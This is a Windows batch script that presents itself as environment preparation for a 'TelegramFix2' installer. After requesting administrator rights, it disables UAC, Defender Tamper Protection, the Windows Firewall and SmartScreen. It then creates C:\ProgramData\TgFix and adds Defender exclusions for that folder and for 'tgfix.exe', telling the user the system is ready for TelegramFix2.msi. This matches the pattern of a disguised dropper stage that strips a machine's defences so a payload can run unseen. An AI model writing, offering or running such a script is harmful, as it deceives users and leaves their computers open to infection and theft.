@echo off
title Prepare Environment for TelegramFix2
echo =========================================
echo   Prepare Environment for TelegramFix2
echo =========================================
echo.

:: Автозапрос прав Администратора
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Administrative privileges required. Requesting elevation...
    powershell start -verb runas '%0'
    exit /b
)
echo [OK] Running as Administrator.
echo.

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] UAC disabled.

:: 2. Disable Tamper Protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Tamper Protection disabled.

:: 3. Disable Windows Firewall
netsh advfirewall set allprofiles state off >nul 2>&1
echo [OK] Windows Firewall disabled.

:: 4. Disable SmartScreen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] SmartScreen disabled.

:: 5. Create target folder
mkdir "C:\ProgramData\TgFix" 2>nul
echo [OK] Folder C:\ProgramData\TgFix created.

:: 6. Add Defender exclusions
where powershell >nul 2>&1
if %errorlevel% equ 0 (
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\TgFix'" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionProcess 'tgfix.exe'" >nul 2>&1
    echo [OK] Defender exclusions added via PowerShell.
) else (
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\TgFix" /t REG_SZ /d "0" /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "tgfix.exe" /t REG_SZ /d "0" /f >nul 2>&1
    echo [OK] Defender exclusions added via Registry.
)

echo.
echo =========================================
echo   Environment prepared successfully.
echo   You can now install TelegramFix2.msi
echo =========================================
echo.
pause